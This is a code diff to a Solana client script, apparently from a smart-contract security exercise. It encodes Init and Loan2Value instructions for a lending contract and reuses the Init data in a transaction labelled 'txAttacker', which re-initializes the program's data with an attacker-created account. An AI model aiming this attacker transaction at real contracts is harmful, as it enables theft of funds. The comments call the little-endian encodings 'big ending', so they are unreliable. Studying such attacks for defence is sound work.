@@ -1,6 +1,6 @@
 const fs = require('fs');
 const web3 = require("@solana/web3.js");
-const {struct, b, u8, u32} = require("@solana/buffer-layout");
+const {struct, b, u8, blob} = require("@solana/buffer-layout");
 
 export const invoke = async (loan: string, collateral: string) => {
     /* Obtain the contract keypair */
@@ -50,17 +50,22 @@ export const invoke = async (loan: string, collateral: string) => {
          {pubkey: loanKey, isSigner: false, isWritable: false},
          {pubkey: collateralKey, isSigner: false, isWritable: false},
         ];
-    let dataLayout = struct([ u8('instruction') ])
-    let data = Buffer.alloc(dataLayout.span);
+
+    let initLayout = struct([ u8('instruction') ])
+    let initData = Buffer.alloc(initLayout.span);
+    let loan2ValueLayout = struct([
+        u8('instruction'), blob(8, 'loan_qty'), blob(8, 'collateral_qty')
+    ])
+    let loan2ValueData = Buffer.alloc(loan2ValueLayout.span);
 
     /* Invoke the Init instruction (instruction #0) */
     console.log("Creating data account and invoking Init...");
     let txInit = new web3.Transaction({ feePayer: payer.publicKey });
-    dataLayout.encode(Object.assign({instruction: 0}), data);
+    initLayout.encode({instruction: 0}, initData);
     txInit.add(
         createInst,                        /* Create data account */
         new web3.TransactionInstruction({  /* Initialize data account */
-            data: data,
+            data: initData,
             keys: accounts,
             programId: contract.publicKey
         })
@@ -72,11 +77,19 @@ export const invoke = async (loan: string, collateral: string) => {
 
     /* Invoke the Loan2Value instruction (instruction #1) */
     console.log("Checking loan to value ratio...");
+    /* Encode 0x1 in big ending */
+    let loan_qty = Buffer.from('0100000000000000', 'hex');
+    /* Encode 0xbb8 (3000) in big ending */
+    let collateral_qty = Buffer.from('b80b000000000000', 'hex');
     let txCheck = new web3.Transaction({ feePayer: payer.publicKey });
-    dataLayout.encode(Object.assign({instruction: 1}), data);
+    loan2ValueLayout.encode(
+        {instruction: 1,
+         loan_qty: blob(8).decode(loan_qty),
+         collateral_qty: blob(8).decode(collateral_qty)}
+    , loan2ValueData);
     txCheck.add(
         new web3.TransactionInstruction({
-            data: data,
+            data: loan2ValueData,
             keys: accounts,
             programId: contract.publicKey
         })
@@ -101,11 +114,10 @@ export const invoke = async (loan: string, collateral: string) => {
     });
 
     let txAttacker = new web3.Transaction({ feePayer: payer.publicKey });
-    dataLayout.encode(Object.assign({instruction: 0}), data);
     txAttacker.add(
         attackerCreateInst,
         new web3.TransactionInstruction({
-            data: data,
+            data: initData,
             keys: accounts,
             programId: contract.publicKey
         })
